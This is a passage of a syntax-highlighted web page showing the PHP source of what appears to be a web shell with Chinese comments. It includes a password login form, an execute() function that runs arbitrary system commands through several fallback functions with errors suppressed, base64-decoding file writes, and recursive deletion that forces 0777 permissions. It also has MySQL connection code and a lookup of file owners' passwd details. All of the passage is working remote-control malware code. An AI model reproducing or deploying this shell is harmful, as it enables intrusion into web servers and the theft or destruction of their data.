</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                height: 18px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                border: 1px solid #666666;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/style&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;form method=&#34;POST&#34; action=&#34;&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;span style=&#34;font:11px Verdana;&#34;&gt;Password: &lt;/span&gt;&lt;input name=&#34;password&#34; type=&#34;password&#34; size=&#34;20&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;input type=&#34;hidden&#34; name=&#34;action&#34; value=&#34;login&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            &lt;input type=&#34;submit&#34; value=&#34;Login&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;?php
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        exit;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">} //end loginpage()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function execute($cfe)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $res = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($cfe) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if (function_exists(&#39;system&#39;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @ob_start();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @system($cfe);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $res = @ob_get_contents();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @ob_end_clean();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } elseif (function_exists(&#39;passthru&#39;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @ob_start();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @passthru($cfe);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $res = @ob_get_contents();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @ob_end_clean();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } elseif (function_exists(&#39;shell_exec&#39;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $res = @shell_exec($cfe);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } elseif (function_exists(&#39;exec&#39;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @exec($cfe, $res);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $res = join(&#34;\n&#34;, $res);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        } elseif (@is_resource($f = @popen($cfe, &#34;r&#34;))) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $res = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            while (!@feof($f)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                $res .= @fread($f, 1024);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @pclose($f);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $res;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function which($pr)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $path = execute(&#34;which $pr&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return ($path ? $path : $pr);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function cf($fname, $text)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($fp = @fopen($fname, &#39;w&#39;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        @fputs($fp, @base64_decode($text));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        @fclose($fp);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function dirsize($dir)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $dh = @opendir($dir);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $size = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    while ($file = @readdir($dh)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if ($file != &#39;.&#39; &amp;&amp; $file != &#39;..&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $path = $dir . &#39;/&#39; . $file;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $size += @is_dir($path) ? dirsize($path) : @filesize($path);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    @closedir($dh);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $size;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 页面调试信息
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function debuginfo()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $starttime;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $mtime = explode(&#39; &#39;, microtime());
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    echo &#39;Processed in &#39; . $totaltime . &#39; second(s)&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">//连接MYSQL数据库
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function mydbconn($dbhost, $dbuser, $dbpass, $dbname = &#39;&#39;, $charset = &#39;&#39;, $dbport = &#39;3306&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $charsetdb;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    @ini_set(&#39;mysql.connect_timeout&#39;, 5);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (!$link = @mysql_connect($dbhost . &#39;:&#39; . $dbport, $dbuser, $dbpass)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        p(&#39;&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        exit;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($link &amp;&amp; $dbname) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if (!@mysql_select_db($dbname, $link)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            p(&#39;&lt;h2&gt;Database selected has error&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            exit;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($link &amp;&amp; mysql_get_server_info() &gt; &#39;4.1&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if ($charset &amp;&amp; in_array(strtolower($charset), $charsetdb)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            q(&#34;SET character_set_connection=$charset, character_set_results=$charset, character_set_client=binary;&#34;, $link);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $link;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 去掉转义字符
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function s_array(&amp;$array)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (is_array($array)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        foreach ($array as $k =&gt; $v) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $array[$k] = s_array($v);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else if (is_string($array)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $array = stripslashes($array);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $array;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 清除HTML代码
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function html_clean($content)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $content = htmlspecialchars($content);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $content = str_replace(&#34;\n&#34;, &#34;&lt;br /&gt;&#34;, $content);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $content = str_replace(&#34;  &#34;, &#34;  &#34;, $content);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $content = str_replace(&#34;\t&#34;, &#34;    &#34;, $content);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $content;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 获取权限
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function getChmod($filepath)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return substr(base_convert(@fileperms($filepath), 10, 8), -4);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function getPerms($filepath)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $mode = @fileperms($filepath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (($mode &amp; 0xC000) === 0xC000) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $type = &#39;s&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } elseif (($mode &amp; 0x4000) === 0x4000) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $type = &#39;d&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } elseif (($mode &amp; 0xA000) === 0xA000) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $type = &#39;l&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } elseif (($mode &amp; 0x8000) === 0x8000) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $type = &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } elseif (($mode &amp; 0x6000) === 0x6000) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $type = &#39;b&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } elseif (($mode &amp; 0x2000) === 0x2000) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $type = &#39;c&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } elseif (($mode &amp; 0x1000) === 0x1000) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $type = &#39;p&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $type = &#39;?&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $owner[&#39;read&#39;] = ($mode &amp; 00400) ? &#39;r&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $owner[&#39;write&#39;] = ($mode &amp; 00200) ? &#39;w&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $owner[&#39;execute&#39;] = ($mode &amp; 00100) ? &#39;x&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $group[&#39;read&#39;] = ($mode &amp; 00040) ? &#39;r&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $group[&#39;write&#39;] = ($mode &amp; 00020) ? &#39;w&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $group[&#39;execute&#39;] = ($mode &amp; 00010) ? &#39;x&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $world[&#39;read&#39;] = ($mode &amp; 00004) ? &#39;r&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $world[&#39;write&#39;] = ($mode &amp; 00002) ? &#39;w&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $world[&#39;execute&#39;] = ($mode &amp; 00001) ? &#39;x&#39; : &#39;-&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($mode &amp; 0x800) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $owner[&#39;execute&#39;] = ($owner[&#39;execute&#39;] == &#39;x&#39;) ? &#39;s&#39; : &#39;S&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($mode &amp; 0x400) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $group[&#39;execute&#39;] = ($group[&#39;execute&#39;] == &#39;x&#39;) ? &#39;s&#39; : &#39;S&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($mode &amp; 0x200) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $world[&#39;execute&#39;] = ($world[&#39;execute&#39;] == &#39;x&#39;) ? &#39;t&#39; : &#39;T&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $type . $owner[&#39;read&#39;] . $owner[&#39;write&#39;] . $owner[&#39;execute&#39;] . $group[&#39;read&#39;] . $group[&#39;write&#39;] . $group[&#39;execute&#39;] . $world[&#39;read&#39;] . $world[&#39;write&#39;] . $world[&#39;execute&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function getUser($filepath)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (function_exists(&#39;posix_getpwuid&#39;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $array = @posix_getpwuid(@fileowner($filepath));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if ($array &amp;&amp; is_array($array)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            return &#39; / &lt;a href=&#34;#&#34; title=&#34;User: &#39; . $array[&#39;name&#39;] . &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Passwd: &#39; . $array[&#39;passwd&#39;] . &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Uid: &#39; . $array[&#39;uid&#39;] . &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">gid: &#39; . $array[&#39;gid&#39;] . &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Gecos: &#39; . $array[&#39;gecos&#39;] . &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Dir: &#39; . $array[&#39;dir&#39;] . &#39;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Shell: &#39; . $array[&#39;shell&#39;] . &#39;&#34;&gt;&#39; . $array[&#39;name&#39;] . &#39;&lt;/a&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 删除目录
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function deltree($deldir)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $mydir = @dir($deldir);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    while ($file = $mydir-&gt;read()) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if ((is_dir($deldir . &#39;/&#39; . $file)) &amp;&amp; ($file != &#39;.&#39;) &amp;&amp; ($file != &#39;..&#39;)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @chmod($deldir . &#39;/&#39; . $file, 0777);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            deltree($deldir . &#39;/&#39; . $file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        if (is_file($deldir . &#39;/&#39; . $file)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @chmod($deldir . &#39;/&#39; . $file, 0777);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            @unlink($deldir . &#39;/&#39; . $file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $mydir-&gt;close();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    @chmod($deldir, 0777);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return @rmdir($deldir) ? 1 : 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 表格行间的背景色替换
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function bg()
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $bgc;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return ($bgc++ % 2 == 0) ? &#39;alt1&#39; : &#39;alt2&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 获取当前的文件系统路径
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function getPath($scriptpath, $nowpath)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($nowpath == &#39;.&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $nowpath = $scriptpath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $nowpath = str_replace(&#39;\\&#39;, &#39;/&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $nowpath = str_replace(&#39;//&#39;, &#39;/&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if (substr($nowpath, -1) != &#39;/&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        $nowpath = $nowpath . &#39;/&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $nowpath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 获取当前目录的上级目录
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function getUpPath($nowpath)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $pathdb = explode(&#39;/&#39;, $nowpath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $num = count($pathdb);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($num &gt; 2) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        unset($pathdb[$num - 1], $pathdb[$num - 2]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $uppath = implode(&#39;/&#39;, $pathdb) . &#39;/&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $uppath = str_replace(&#39;//&#39;, &#39;/&#39;, $uppath);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $uppath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 检查PHP配置参数
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function getcfg($varname)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $result = get_cfg_var($varname);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($result == 0) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return &#39;No&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } elseif ($result == 1) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return &#39;Yes&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        return $result;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 检查函数情况
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function getfun($funName)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return (false !== function_exists($funName)) ? &#39;Yes&#39; : &#39;No&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// 获得文件扩展名
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function getext($file)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    $info = pathinfo($file);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    return $info[&#39;extension&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">function GetWDirList($dir)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">{
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    global $dirdata, $j, $nowpath;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    !$j &amp;&amp; $j = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    if ($dh = opendir($dir)) {
